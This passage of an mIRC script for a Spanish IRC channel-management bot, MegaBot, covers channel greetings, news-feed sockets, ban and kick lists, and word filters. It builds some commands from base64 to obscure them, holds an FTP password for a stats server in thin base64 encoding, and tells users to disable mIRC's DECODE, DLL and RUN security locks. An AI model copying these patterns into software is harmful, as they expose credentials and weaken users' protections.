    if ($me isop $hget(canales,1).item) { onotice $hget(canales,1).item Todo listo, preparado para cumplir las ordenes. }
    else { msg $hget(canales,1).item Todo listo, preparado para cumplir las ordenes. }
  }
  if ($me ison $hget(canales,2).item) && (%START.NOSAY. [ $+ [ $hget(canales,2).item ] ] == $null) {
    if ($me isop $hget(canales,2).item) { onotice $hget(canales,2).item Todo listo, preparado para cumplir las ordenes. }
    else { msg $hget(canales,2).item Todo listo, preparado para cumplir las ordenes. }
  }
  if ($me ison $hget(canales,3).item) && (%START.NOSAY. [ $+ [ $hget(canales,3).item ] ] == $null) {
    if ($me isop $hget(canales,3).item) { onotice $hget(canales,3).item Todo listo, preparado para cumplir las ordenes. }
    else { msg $hget(canales,3).item Todo listo, preparado para cumplir las ordenes. }
  }
  if ($me ison $hget(canales,4).item) && (%START.NOSAY. [ $+ [ $hget(canales,4).item ] ] == $null) {
    if ($me isop $hget(canales,4).item) { onotice $hget(canales,4).item Todo listo, preparado para cumplir las ordenes. }
    else { msg $hget(canales,4).item Todo listo, preparado para cumplir las ordenes. }
  }
  if ($me ison $hget(canales,5).item) && (%START.NOSAY. [ $+ [ $hget(canales,5).item ] ] == $null) {
    if ($me isop $hget(canales,5).item) { onotice $hget(canales,5).item Todo listo, preparado para cumplir las ordenes. }
    else { msg $hget(canales,5).item Todo listo, preparado para cumplir las ordenes. }
  }
}
Alias limpialos {
  if ($me ison $1) && ($2) && ($me isop $1) {
    unset %status* | :1 | if (%status.n >= $hget(i- $+ $1,0).item) { inc %status.fa 3 | .timerLIMPFN- $+ $1 1 %status.fa unset %limp- $+ $1 | .timerLIMPFN2- $+ $1 1 %status.fa msg $iif($3,$3,$1) $iif(%status.fa == 3,2No falta nadie 12][,2 $+ $chr(40) $+ $pn00($duration($calc($ctime - $2))) $+ 2 $+ $chr(41)) 2LIMPIALOS2 Finalizado. | halt }
    inc %status.n | if ($hget(i- $+ $1,%status.n).item !ison $1) && ($hget(i- $+ $1,%status.n).item) && ($gettok($hget(r- $+ $1,$hget(i- $+ $1,%status.n).item),1,32) > $hget(l- $+ $1,NOJOIN)) { inc %status.fa 6 | .timerrlims- $+ $1 $+ $hget(i- $+ $1,%status.n).item 1 %status.fa msg chan access $1 del $hget(i- $+ $1,%status.n).item } | goto 1
  }
}
alias noticias.c {
  window -c @noticias | window +d @noticias $calc(223 + $gettok(%mbot.dim,1,32)) $calc(123 + $gettok(%mbot.dim,2,32)) 400 280
  echo @noticias $dll(%RHDl $+ nHTMLn.dll,attach,$window(@noticias).hwnd)
  echo @noticias $dll(%RHDl $+ nHTMLn.dll,navigate,http://www.maincenter.es/mc-services/megabot/3.7/Noticias.html)
  window -ha @noticias | c-l.not.mous
}
Alias html { return $html.c($regsubex($1-,/<[^>]+(?:>|$)|^[^<>]+>/g,)) }
alias html.c { return $remove($replace($1-,&#250;,˙,&#225;,·,√ë,—,‚Äù,",‚Äú,",¬Ä,Ä,¬ø,ø,&#39;,',&ndash;,ñ,√º,¸,&lt;,<,&gt;,>,&amp;,&,&quot;,",&aacute;,·,&agrave;,‡,&eacute;,È,&egrave;,Ë,&iacute;,Ì,&igrave;,Ï,&oacute;,Û,&ograve;,Ú,&uacute;,˙,&ugrave;,˘,&auml;,‰,&acirc;,‚,&euml;,Î,&ecirc;,Í,&iuml;,Ô,&icirc;,Ó,&ouml;,ˆ,&ocirc;,Ù,&uuml;,¸,&ucirc;,˚,&aring;,Â,&atilde;,„,&ccedil;,Á,&ntilde;,Ò,&Yacute;,›,&otilde;,ı,&yacute;,˝,&Oslash;,ÿ,&yuml;,ˇ,&oslash;,¯,&THORN;,ﬁ,&ETH;,–,&thorn;,˛,&eth;,,&AElig;,∆,&szlig;,ﬂ,&aelig;,Ê,&frac14;,º,&nbsp;,$chr(32),&frac12;,Ω,&iexcl;,°,&frac34;,æ,&pound;,£,&copy;,©,&yen;,•,&reg;,Æ,&sect;,ß,&ordf;,™,&curren;,§,&sup2;,≤,&brvbar;,¶,&macr;,Ø,&not;,¨,&laquo;,´,&acute;,¥,&uml;,®,&raquo;,ª,&ordm;,∫,&cedil;,∏,&iquest;,ø,√≥,Û,√∫,˙,√≠,Ì,√©,È,√°,·,√±,Ò,&deg;,∫),$chr(9),$chr(147),$chr(148)) }
Alias meneame.rfs { .timermeneame.rfs 1 20 meneame.rfs | if (%MGB == s) { sockclose meneame | sockopen meneame meneame.feedsportal.com 80 } }
Alias elmundo.rfs { .timerelmundo.rfs 1 20 elmundo.rfs | if (%MGB == s) { sockclose ELMUNDO.UH | sockopen ELMUNDO.UH elmundo.feedsportal.com 80 } }
Alias dpntsim { .timerdpntsim 1 20 dpntsim | if (%MGB == s) { sockclose MNOTICIAS | sockopen MNOTICIAS www.marca.com 80 } }
Alias F3 { showmirc -t }
Alias snrg {
  if ($me ison $1) {
    if (%START.NOSAY. [ $+ [ $1 ] ] != $null) && (%MGB == $null) { return }
    if ($me !isop $1) {
      msg $1 2Encontrados12 $hget(r- $+ $1,0).item 2usuarios registrados en el canal.
    }
    else { onotice $1 Encontrados $hget(r- $+ $1,0).item usuarios registrados en el canal. }
  }
}
Alias ancp {
  if ($me ison $hget(canales,1).item) && (%DEPTES- [ $+ [ $hget(canales,1).item ] ] == s) { msg $hget(canales,1).item $1- }
  if ($me ison $hget(canales,2).item) && (%DEPTES- [ $+ [ $hget(canales,2).item ] ] == s) { msg $hget(canales,2).item $1- }
  if ($me ison $hget(canales,3).item) && (%DEPTES- [ $+ [ $hget(canales,3).item ] ] == s) { msg $hget(canales,3).item $1- }
  if ($me ison $hget(canales,4).item) && (%DEPTES- [ $+ [ $hget(canales,4).item ] ] == s) { msg $hget(canales,4).item $1- }
  if ($me ison $hget(canales,5).item) && (%DEPTES- [ $+ [ $hget(canales,5).item ] ] == s) { msg $hget(canales,5).item $1- }
}
Alias meneame.sy {
  if ($me ison $hget(canales,1).item) && (%MeNEAME- [ $+ [ $hget(canales,1).item ] ] == s) { msg $hget(canales,1).item $1- }
  if ($me ison $hget(canales,2).item) && (%MeNEAME- [ $+ [ $hget(canales,2).item ] ] == s) { msg $hget(canales,2).item $1- }
  if ($me ison $hget(canales,3).item) && (%MeNEAME- [ $+ [ $hget(canales,3).item ] ] == s) { msg $hget(canales,3).item $1- }
  if ($me ison $hget(canales,4).item) && (%MeNEAME- [ $+ [ $hget(canales,4).item ] ] == s) { msg $hget(canales,4).item $1- }
  if ($me ison $hget(canales,5).item) && (%MeNEAME- [ $+ [ $hget(canales,5).item ] ] == s) { msg $hget(canales,5).item $1- }
}
Alias elmundo.sy {
  if ($me ison $hget(canales,1).item) && (%ElMUNDO- [ $+ [ $hget(canales,1).item ] ] == s) { msg $hget(canales,1).item $1- }
  if ($me ison $hget(canales,2).item) && (%ElMUNDO- [ $+ [ $hget(canales,2).item ] ] == s) { msg $hget(canales,2).item $1- }
  if ($me ison $hget(canales,3).item) && (%ElMUNDO- [ $+ [ $hget(canales,3).item ] ] == s) { msg $hget(canales,3).item $1- }
  if ($me ison $hget(canales,4).item) && (%ElMUNDO- [ $+ [ $hget(canales,4).item ] ] == s) { msg $hget(canales,4).item $1- }
  if ($me ison $hget(canales,5).item) && (%ElMUNDO- [ $+ [ $hget(canales,5).item ] ] == s) { msg $hget(canales,5).item $1- }
}
Alias rvn {
  if ($me ison $1) && ($2) {
    unset %status* | :1 | if (%status.n >= $hget(i- $+ $1,0).item) { inc %status.fa 3 | .timerRVIFN- $+ $1 1 %status.fa unset %rvn- $+ $1 | .timerRVnIFN2- $+ $1 1 %status.fa msg $iif($3,$3,$1) $iif(%status.fa == 3,2No falta nadie 12][,2 $+ $chr(40) $+ $pn00($duration($calc($ctime - $2))) $+ 2 $+ $chr(41)) 2RVN2 Finalizado. | halt }
    inc %status.n | if ($hget(i- $+ $1,%status.n).item !ison $1) && ($hget(i- $+ $1,%status.n).item) && ($gettok($hget(r- $+ $1,$hget(i- $+ $1,%status.n).item),1,32) > $hget(l- $+ $1,NOJOIN)) { inc %status.fa 8 | .timerrnvs- $+ $1 $+ $hget(i- $+ $1,%status.n).item 1 %status.fa .notice $hget(i- $+ $1,%status.n).item %rvmsg- [ $+ [ $1 ] ] } | goto 1
  }
}
Alias acz { return $replace($1,·,a,È,e,Ì,i,Û,o,˙,u,‡,a,Ë,e,Ï,i,Ú,o,˘,u,‰,a,Î,e,Ô,i,ˆ,o,¸,u,‚,a,Í,e,Ó,i,Ù,o,˚,u,¡,A,…,E,Õ,I,”,O,⁄,U,¿,A,»,E,Ã,I,“,O,Ÿ,U,ƒ,A,À,E,œ,I,÷,O,‹,U,ƒ,A, ,E,Œ,I,‘,O,€,U) }
On *:KEYDOWN:@*:13:{
  if (!$editbox($target)) {
    unset %2- [ $+ [ $target ] ] % [ $+ [ $remove($target,@) ] ]
    if ($target == @SERVIDOR) || ($target == @PROXY) || ($target == @NICKB) || ($target == @NICKBP) { datv-conexion }
    if ($target == @CA.C) || ($target == @CA.P) || ($target == @CA.M) { dath-canales }
    if ($target == @USER.PROT) { hdel prote u | hsave -o prote %rhcn $+ prote.hash | datv-proteccion }
    if ($target == @USER.PASS) { hdel prote p | hsave -o prote %rhcn $+ prote.hash | datv-proteccion }
    if ($target == @pro.u) || ($target == @pro.p) { datv-protegido }
    if ($target == @contacto.n) || ($target == @contacto.a) || ($target == @contacto.e) { datv-contacto }
    if ($target == @emisora.port) || ($target == @emisora.ip) || ($target == @emisora.sg) || ($target == @emisora.ipm) { datv-emisora }
    if ($target == @contacto.m) { unset %ccont | wc scont | wc dcont | datv-contacto } | halt
  }
  set %2- [ $+ [ $target ] ] $editbox($target)
}
ON *:INPUT:*:{
  if ($1 == /onotice) && ($2) && ($chan) && ($me isop $chan) { onotice $chan $2- | halt }
  if ($mid($1-,1,1) == /) { haltdef | halt }
  if ($mid($1-,1,1) != /) && ($mid($target,1,1) != @) {
    if ($mid($target,1,1) == $chr(35)) { echo $target 3[02 $+ $time $+ 3] $iif($mid($nick($target,$me).pnick,1,1) != $mid($me,1,1),6(3 $+ $mid($nick($target,$nick).pnick,1,1) $+ 6)) 12 $+ $me $+ : $1- | .msg $target $1- | haltdef }
    elseif ($query($target)) { echo $target 3[02 $+ $time $+ 3] 12 $+ $me $+ : $1- | .msg $target $1- | haltdef }
  }
  if ($mid($target,1,1) == @) {
    set % $+ $remove($target,@) %2- [ $+ [ $target ] ] | unset %2- [ $+ [ $target ] ]
    if ($target == @SERVIDOR) || ($target == @PROXY) || ($target == @NICKB) || ($target == @NICKBP) { datv-conexion }
    if ($target == @CA.C) || ($target == @CA.P) || ($target == @CA.M) { dath-canales }
    if ($target == @USER.PROT) { set %USER.PROT $encode($encode(%USER.PROT,m),m) | hadd prote u %USER.PROT | hsave -o prote %rhcn $+ prote.hash | datv-proteccion  }
    if ($target == @USER.PASS) { hadd prote p $md5($md5($md5(%USER.PASS))) | hsave -o prote %rhcn $+ prote.hash | set %USER.PASS $str(*,$len(%USER.PASS)) | datv-proteccion }
    if ($target == @pro.u) || ($target == @pro.p) { datv-protegido }
    if ($target == @contacto.n) || ($target == @contacto.a) || ($target == @contacto.e) { datv-contacto }
    if ($target == @emisora.port) || ($target == @emisora.ip) || ($target == @emisora.sg) || ($target == @emisora.ipm) { if (%emisora.port !isnum) || (- isin %emisora.port) || (+ isin %emisora.port) { unset %emisora.port } | if (%emisora.sg !isnum) || (- isin %emisora.sg) || (+ isin %emisora.sg) { unset %emisora.sg } | datv-emisora }
    if ($target == @contacto.m) { set %cconts 0 | unset %ccont | window -lh @scont | aline @scont %contacto.m | trozwin scont dcont Times-New-Roman 17 352 584 | datv-contacto } | ezit.edit
} }
Ctcp ^*:*:*:{ if ($nick == $me) { if ($1 == PING) && (%ctp.lag) { %lag.gb = $duration($calc($ctime - $2)) | msg %ctp.lag 2Lag detectado: 12 $+ $pn00(%lag.gb) $+  | unset %ctp.lag } } | else { if ($1 == VERSION) || ($1 == PING) { haltdef | halt } } }
on *:NOTIFY:{
  if (r isin $usermode) {
    if ($nick == NiCK) {
      if ($network == IRC-Hispano) { .timerinfome 1 3 .msg nick LISTCHANS all }
      else { .timerinfome 1 3 .msg nick info $me full }
    }
    if ($nick == CHaN) {
      %notif.idnt = 1
      if ($hget(canales,$hget(canales,1).item)) { inc %notif.idnt 3 | .timerIDNTF-1 1 %notif.idnt .msg chan identify $hget(canales,1).item $hget(canales,$hget(canales,1).item) }
      if ($hget(canales,$hget(canales,2).item)) { inc %notif.idnt 3 | .timerIDNTF-2 1 %notif.idnt .msg chan identify $hget(canales,2).item $hget(canales,$hget(canales,2).item) }
      if ($hget(canales,$hget(canales,3).item)) { inc %notif.idnt 3 | .timerIDNTF-3 1 %notif.idnt .msg chan identify $hget(canales,3).item $hget(canales,$hget(canales,3).item) }
      if ($hget(canales,$hget(canales,4).item)) { inc %notif.idnt 3 | .timerIDNTF-4 1 %notif.idnt .msg chan identify $hget(canales,4).item $hget(canales,$hget(canales,4).item) }
      if ($hget(canales,$hget(canales,5).item)) { inc %notif.idnt 3 | .timerIDNTF-5 1 %notif.idnt .msg chan identify $hget(canales,5).item $hget(canales,$hget(canales,5).item) }
      if ($hget(canales,1).item) { inc %notif.idnt 3 | .timerLEVELS-1 1 %notif.idnt .msg chan levels $hget(canales,1).item list }
      if ($hget(canales,2).item) { inc %notif.idnt 3 | .timerLEVELS-2 1 %notif.idnt .msg chan levels $hget(canales,2).item list }
      if ($hget(canales,3).item) { inc %notif.idnt 3 | .timerLEVELS-3 1 %notif.idnt .msg chan levels $hget(canales,3).item list }
      if ($hget(canales,4).item) { inc %notif.idnt 3 | .timerLEVELS-4 1 %notif.idnt .msg chan levels $hget(canales,4).item list }
      if ($hget(canales,5).item) { inc %notif.idnt 3 | .timerLEVELS-5 1 %notif.idnt .msg chan levels $hget(canales,5).item list }
    }
  }
}
on *:UNOTIFY:{ if ($nick == CHaN) { unset %fath.n } }
on *:connect:{
  ;if (ChatZona isin $server) || ($network == ChatZona) { chatzona.p | halt }
  close -m | statsconf | set %conb on | .ial on | tit | if (%act == @conexion) { datv-conexion } | unset %lines.chan-* | unset %ayuda.megabot %MGB %MNOTICIAS | unset %statuz* %actmN %qbanss* | unset %rvi-* %limp-* | unset %dway-* | unset %rvm-* %rvn-* | unset %tms.* %barre-* %AWAY-*
  if ($network != GlobalChat) { if ($me != $hget(conexion,nickb)) { ghost $hget(conexion,nickb) $+ : $+ $hget(conexion,nickbp) } }
  unset %proxyf-* %n.servers %who.ncompa %traductor.* %ELMUNDO.UTITLE %temp.youtube.*
  unset %stats.line.* %tms.lineas-* %Stats.act %meneame.up
  if (%emisora.st) { set %norepit.all.a o } | else { unset %norepit.all.a }
  hfree -w vist | hmake vist | hfree -w reps | hmake reps | hfree -w antimayus | hmake antimayus | hfree -w antipalabrotas | hmake antipalabrotas | hfree -w antisexo | hmake antisexo
  if ($network != GlobalChat) { .timerenb 1 4 nick $hget(conexion,nickb) $+ ! $+ $hget(conexion,nickbp) }
  else { .timerenb 1 4 nick $hget(conexion,nickb) }
  .timerdpntsim 1 93 dpntsim | .timermeneame.rfs 1 93 meneame.rfs | .timerelmundo.rfs 1 103 elmundo.rfs | if (%actm == @conexion) { datv-conexion } | if (%emisora.st) { emon.is }
  if ($me == $hget(conexion,nickb)) { notify nick | .timerrgs 1 3 notify chan | .timerprm 1 5 prmc }
  .timerunban.exp 1 160 bans.exp | .timerauto.banner.ons 1 190 auto.banner.ons | .timerstats.auto 1 220 stats.auto
  if ($network != IRC-Hispano) { sockclose mb | sockopen mb irc.irc-hispano.org 6667 }
}
on *:Nick:{
  if ($newnick == $hget(conexion,nickb)) {
    notify nick | .timerrgs 1 3 notify chan | .timerprm 1 5 prmc
    if (%DOCK) { .msg x dock }
  }
  else {
    if ($timer(PROX- $+ $hget(canales,1).item $+ - $+ $nick)) { .timerPROX- $+ $hget(canales,1).item $+ - $+ $newnick 1 $timer(PROX- $+ $hget(canales,1).item $+ - $+ $nick).secs PROY $hget(canales,1).item $newnick $gettok($timer(PROX- $+ $hget(canales,1).item $+ - $+ $nick).com,4-,32) | .timerPROX- $+ $hget(canales,1).item $+ - $+ $nick off }
    if ($timer(PROX- $+ $hget(canales,2).item $+ - $+ $nick)) { .timerPROX- $+ $hget(canales,2).item $+ - $+ $newnick 1 $timer(PROX- $+ $hget(canales,2).item $+ - $+ $nick).secs PROY $hget(canales,2).item $newnick $gettok($timer(PROX- $+ $hget(canales,2).item $+ - $+ $nick).com,4-,32) | .timerPROX- $+ $hget(canales,2).item $+ - $+ $nick off }
    if ($timer(PROX- $+ $hget(canales,3).item $+ - $+ $nick)) { .timerPROX- $+ $hget(canales,3).item $+ - $+ $newnick 1 $timer(PROX- $+ $hget(canales,3).item $+ - $+ $nick).secs PROY $hget(canales,3).item $newnick $gettok($timer(PROX- $+ $hget(canales,3).item $+ - $+ $nick).com,4-,32) | .timerPROX- $+ $hget(canales,3).item $+ - $+ $nick off }
    if ($timer(PROX- $+ $hget(canales,4).item $+ - $+ $nick)) { .timerPROX- $+ $hget(canales,4).item $+ - $+ $newnick 1 $timer(PROX- $+ $hget(canales,4).item $+ - $+ $nick).secs PROY $hget(canales,4).item $newnick $gettok($timer(PROX- $+ $hget(canales,4).item $+ - $+ $nick).com,4-,32) | .timerPROX- $+ $hget(canales,4).item $+ - $+ $nick off }
    if ($timer(PROX- $+ $hget(canales,5).item $+ - $+ $nick)) { .timerPROX- $+ $hget(canales,5).item $+ - $+ $newnick 1 $timer(PROX- $+ $hget(canales,5).item $+ - $+ $nick).secs PROY $hget(canales,5).item $newnick $gettok($timer(PROX- $+ $hget(canales,5).item $+ - $+ $nick).com,4-,32) | .timerPROX- $+ $hget(canales,5).item $+ - $+ $nick off }
    .timershitlist.m. $+ $newnick -m 1 1 shitlist.m $newnick
    .timernick.ncom.m. $+ $newnick -m 1 1 nick.ncom.m $newnick
  }
}
alias shitlist.m {
  if ($address($1,5) != $null) {
    if (!$findtok($hget(masters,$hget(canales,1).item),$1,32)) && ($shitlist.exist(shit,$hget(canales,1).item,$address($1,5)) != $null) && ($1 ison $hget(canales,1).item) && ($me isop $hget(canales,1).item) { mode $hget(canales,1).item +bb $1 $address($1,2) | kick $hget(canales,1).item $1 $shitlist.exist(shit,$hget(canales,1).item,$address($1,5)) | halt }
    if (!$findtok($hget(masters,$hget(canales,2).item),$1,32)) && ($shitlist.exist(shit,$hget(canales,2).item,$address($1,5)) != $null) && ($1 ison $hget(canales,2).item) && ($me isop $hget(canales,2).item) { mode $hget(canales,2).item +bb $1 $address($1,2) | kick $hget(canales,2).item $1 $shitlist.exist(shit,$hget(canales,2).item,$address($1,5)) | halt }
    if (!$findtok($hget(masters,$hget(canales,3).item),$1,32)) && ($shitlist.exist(shit,$hget(canales,3).item,$address($1,5)) != $null) && ($1 ison $hget(canales,3).item) && ($me isop $hget(canales,3).item) { mode $hget(canales,3).item +bb $1 $address($1,2) | kick $hget(canales,3).item $1 $shitlist.exist(shit,$hget(canales,3).item,$address($1,5)) | halt }
    if (!$findtok($hget(masters,$hget(canales,4).item),$1,32)) && ($shitlist.exist(shit,$hget(canales,4).item,$address($1,5)) != $null) && ($1 ison $hget(canales,4).item) && ($me isop $hget(canales,4).item) { mode $hget(canales,4).item +bb $1 $address($1,2) | kick $hget(canales,4).item $1 $shitlist.exist(shit,$hget(canales,4).item,$address($1,5)) | halt }
    if (!$findtok($hget(masters,$hget(canales,5).item),$1,32)) && ($shitlist.exist(shit,$hget(canales,5).item,$address($1,5)) != $null) && ($1 ison $hget(canales,5).item) && ($me isop $hget(canales,5).item) { mode $hget(canales,5).item +bb $1 $address($1,2) | kick $hget(canales,5).item $1 $shitlist.exist(shit,$hget(canales,5).item,$address($1,5)) | halt }
} }
on *:load:{ if (%mbot.dim == $null) { set %mbot.dim 145 20 } | set %lactmp o }
on *:exit:{ unset %lactmp }
alias mb.start {
  set %rHcN Sistema\base\BD\ | set %RHDl Sistema\base\DLL\ | unset %HIDDE.STAT | showmirc -x
  if (%lactmp == $null) {
    if ($lock(decode) == $true) || ($lock(dll) == $true) || ($lock(run) == $true) { set %HIDDE.STAT o | .timers off | window -wa "status window" | echo -s Se han detectado unas opciÛnes del mIRC activadas, para que pueda funciona el MegaBOT desactivelas pulsando alt + o vas a Other y Lock desmarque DECODE,DLL,RUN y pulse al OK, Finalmente reinicie el MegaBOT. }
    else {
      w $+ $decode(aW5kb3cgLWggInN0YXR1cyB3aW5kb3ci,m) | .dccpassive off | tit | hfree -w *
      unset %contacto.n2 %ayuda.megabot %temp.youtube.* %stats.line.* %tms.lineas-* %Stats.act
      if (%mbot.dim == $null) { set %mbot.dim 145 20 }
      ;Coloreo el logo:
      :color
      %colorlog = $rand(0,15) | %coloreslogo = 2 3 4 6 7 12
      if (!$findtok(%coloreslogo,%colorlog,32)) { goto color }
      unset %lines.chan-* %norepit.all.a %traductor.*
      set %logo  $+ %colorlog $+ M2egaBot  $+ %colorlog $+ v023.7 -  $+ %colorlog $+ D2isponible en 12www.maincenter.es
      .e $+ $decode(bWFpbGFkZHI=,m) $decode(TUI3LQ==,m) $+ $rand(100,999)
      unset %act %m.ben | unset %ezit %conb | unset %m.cn %prct | gcknk
      hmake prote | if ($exists(%RhCn $+ prote.hash) == $true) { hload prote %rhcn $+ prote.hash }
      hmake conexion | if ($exists(%RhCn $+ conexion.hash) == $true) { hload conexion %rhcn $+ conexion.hash }
      hmake canales | if ($exists(%RhCn $+ canales.hash) == $true) { hload canales %rhcn $+ canales.hash }
      hmake proteccion | if ($exists(%RhCn $+ proteccion.hash) == $true) { hload proteccion %rhcn $+ proteccion.hash }
      hmake masters | if ($exists(%RhCn $+ masters.hash) == $true) { hload masters %rhcn $+ masters.hash }
      if ($hget(prote,segr)) { p $+ $decode(cm90ZWdpZG8=,m) } | else { p $+ $decode(cmluY2lwYWw=,m) }
      if ($exists(Sistema\base\welcome.html) == $true) && (%sttpv) { unset %sttpv | run Sistema\base\welcome.html }
      principal | statsconf | .nick $hget(conexion,nickb) $+ ! $+ $hget(conexion,nickbp) | .anick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(1,100)
      if ($hget(conexion,AUTOC) == Si) {
        if ($hget(canales,1).item) && ($hget(conexion,SERV)) && ($hget(conexion,nickb)) {
          if ($hget(conexion,PROXY)) { firewall -mp+d on $replace($hget(conexion,PROXY),:,$chr(32)) } | else { firewall off } | .notify -r nick | .notify -r chan
          .nick $hget(conexion,nickb) $+ ! $+ $hget(conexion,nickbp) | .anick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(1,100)
          .e $+ $decode(bWFpbGFkZHI=,m) $decode(TUI3LQ==,m) $+ $rand(100,999) | .anick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(1,100) | .identd on $decode(TUI3LQ==,m) $+ $rand(100,999) | server $hget(conexion,SERV)
        }
      }
      actmnm
    }
  }
  unset %lactmp
}
alias statsconf { if ($dialog(Stats) == $null) { window -n @Stats 0 0 0 0 } | if (%Stats.SERV == $null) && (%Stats.USER == $null) && (%Stats.PASS == $null) && (%Stats.PORT == $null) && (%Stats.DIR == $null) && (%Stats.WEB == $null) { set %Stats.SERV ftp.maincenter.es | set %Stats.USER stats | set %Stats.PASS bXVuaWF0bzI0MjQ4 | set %Stats.PORT 21 | set %Stats.DIR / | set %Stats.WEB http://stats.maincenter.es/ } }
alias gcknk { set %nknz $iif($readini(Sistema\base\skins.ini,dats,n),$readini(Sistema\base\skins.ini,dats,n),noskin) | set %color $iif($readini(Sistema\base\skins.ini,dats,c),$readini(Sistema\base\skins.ini,dats,c),0) }
on *:disconnect:{ sockclose mb | .partall | unset %conb | tit | if (%emisora.st) { emon.is } | if (%act == @conexion) { datv-conexion } | if (%act == @estado) { datv-estado } | statsconf | if (%ezit) { unset %ezit | ezit.vnt t } }
on *:quit:{
  if ($nick == $me) {
    .partall | unset %conb | if (%emisora.st) { emon.is }
    if (%act == @conexion) { datv-conexion } | if (%ezit) { unset %ezit | ezit.vnt t }
  }
  else { autolimit2 Q }
}
On *:NOTICE:*:?:{ if ($me == $hget(conexion,nickb)) && ($nick == NiCK) && ($network == GlobalChat) && (Este nick se encuentra registrado. isin $1-) && ($hget(conexion,nickbp) != $null) { .msg nick identify $hget(conexion,nickbp) } }
on *:NOTICE:*:#:{
  if ($nick == CHaN) && ($findtok(%cchnal,$chan,32)) {
    if ($findtok(%fath.n,$chan,32)) && ($3 == desactivado) && ($5 == DEBUG) { .timerDEBUG- $+ $chan 1 2 .msg chan set $chan debug ON }
    if ($2 == cambia) { hadd r- $+ $chan $7 $9 }
    if ($2 == aÒade) { hadd r- $+ $chan $6 $9 }
    if ($2 == quita) { hdel r- $+ $chan $6 }
  }
  if ($me isop $chan) && ($nick ison $chan) && (!$findtok($hget(masters,$chan),$nick,32)) && ($nick !isop $chan) {
    if (%ANTITELEFONOS. [ $+ [ $chan ] ]) && ($nick !isop $chan) && ($iif($hget(l- $+ $chan,NOJOIN) != $null,$iif($hget(l- $+ $chan,NOJOIN) isnum,$hget(l- $+ $chan,NOJOIN),-1),-1) >= $iif($gettok($hget(r- $+ $chan,$nick),1,32) isnum,$gettok($hget(r- $+ $chan,$nick),1,32),-1)) {
      if ($AntiTelefonos($1-) == si) { mode $chan +bb $nick $address($nick,2) | kick $chan $nick $iif(%MSG.KICK.AntiTelefonos. [ $+ [ $chan ] ] != $null,$ifmatch,Los n˙meros telefÛnicos est·n prohibidos en este canal) | halt }
    }
    if (%ANTIPALABROTAS. [ $+ [ $chan ] ]) && ($nick !isop $chan) && ($iif($hget(l- $+ $chan,NOJOIN) != $null,$iif($hget(l- $+ $chan,NOJOIN) isnum,$hget(l- $+ $chan,NOJOIN),-1),-1) >= $iif($gettok($hget(r- $+ $chan,$nick),1,32) isnum,$gettok($hget(r- $+ $chan,$nick),1,32),-1)) {
      if ($ANTIPALABROTAS.exist(anti,$chan,$strip($1-)) == PALABROTA) {
        hadd antipalabrotas $chan $+ \ $+ $nick $calc($hget(antipalabrotas,$chan $+ \ $+ $nick) + 1)
        .timerantipalabrotas. $+ $chan $+ \ $+ $nick 1 40 hdel antipalabrotas $chan $+ \ $+ $nick
        %protnavisos = $iif(%AVISOS.ANTIPALABROTAS. [ $+ [ $chan ] ] == $null,2,%AVISOS.ANTIPALABROTAS. [ $+ [ $chan ] ])
        if ($hget(antipalabrotas,$chan $+ \ $+ $nick) > %protnavisos) { hdel antipalabrotas $chan $+ \ $+ $nick | .timerantipalabrotas. $+ $chan $+ \ $+ $nick off | mode $chan +bb $nick $address($nick,2) | kick $chan $nick $iif(%MSG.KICK.ANTIPALABROTAS. [ $+ [ $chan ] ] != $null,%MSG.KICK.ANTIPALABROTAS. [ $+ [ $chan ] ],Las palabrotas est·n prohibidas) | halt }
        else { .timerantipalabrotasAvisa- $+ $chan -m 1 500 $iif(%AVISA.CANAL- [ $+ [ $chan ] ],msg $chan,notice $nick) $nick $iif(%MSG.AVISO.ANTIPALABROTAS. [ $+ [ $chan ] ] != $null,%MSG.AVISO.ANTIPALABROTAS. [ $+ [ $chan ] ],°Las palabrotas est·n prohibidas!) $hget(antipalabrotas,$chan $+ \ $+ $nick) $iif($calc($hget(antipalabrotas,$chan $+ \ $+ $nick) + 1) > %protnavisos,y ultimo) aviso. }
      }
    }
    if (%ANTISEXO. [ $+ [ $chan ] ]) && ($nick !isop $chan) && ($iif($hget(l- $+ $chan,NOJOIN) != $null,$iif($hget(l- $+ $chan,NOJOIN) isnum,$hget(l- $+ $chan,NOJOIN),-1),-1) >= $iif($gettok($hget(r- $+ $chan,$nick),1,32) isnum,$gettok($hget(r- $+ $chan,$nick),1,32),-1)) {
      if ($ANTISEXO.exist(anti,$chan,$strip($1-)) == SEXO) {
        hadd ANTISEXO $chan $+ \ $+ $nick $calc($hget(ANTISEXO,$chan $+ \ $+ $nick) + 1)
        .timerANTISEXO. $+ $chan $+ \ $+ $nick 1 40 hdel ANTISEXO $chan $+ \ $+ $nick
        %protnavisos = $iif(%AVISOS.ANTISEXO. [ $+ [ $chan ] ] == $null,2,%AVISOS.ANTISEXO. [ $+ [ $chan ] ])
        if ($hget(ANTISEXO,$chan $+ \ $+ $nick) > %protnavisos) { hdel ANTISEXO $chan $+ \ $+ $nick | .timerANTISEXO. $+ $chan $+ \ $+ $nick off | mode $chan +bb $nick $address($nick,2) | kick $chan $nick $iif(%MSG.KICK.ANTISEXO. [ $+ [ $chan ] ] != $null,%MSG.KICK.ANTISEXO. [ $+ [ $chan ] ],El sexo en este canal est· prohibido) | halt }
        else { .timerANTISEXOAvisa- $+ $chan -m 1 500 $iif(%AVISA.CANAL- [ $+ [ $chan ] ],msg $chan,notice $nick) $nick $iif(%MSG.AVISO.ANTISEXO. [ $+ [ $chan ] ] != $null,%MSG.AVISO.ANTISEXO. [ $+ [ $chan ] ],°El sexo en este canal est· prohibido!) $hget(ANTISEXO,$chan $+ \ $+ $nick) $iif($calc($hget(antisexo,$chan $+ \ $+ $nick) + 1) > %protnavisos,y ultimo) aviso. }
      }
    }
    if (%antimayus. [ $+ [ $chan ] ]) && ($nick !isop $chan) && ($iif($hget(l- $+ $chan,NOJOIN) != $null,$iif($hget(l- $+ $chan,NOJOIN) isnum,$hget(l- $+ $chan,NOJOIN),-1),-1) >= $iif($gettok($hget(r- $+ $chan,$nick),1,32) isnum,$gettok($hget(r- $+ $chan,$nick),1,32),-1)) {
      %antmys.d = $strip($1-) | %antmys.d2 = 1 | while ($nick($chan,%antmys.d2)) { set %antmys.d $remove(%antmys.d,$ifmatch) | inc %antmys.d2 }
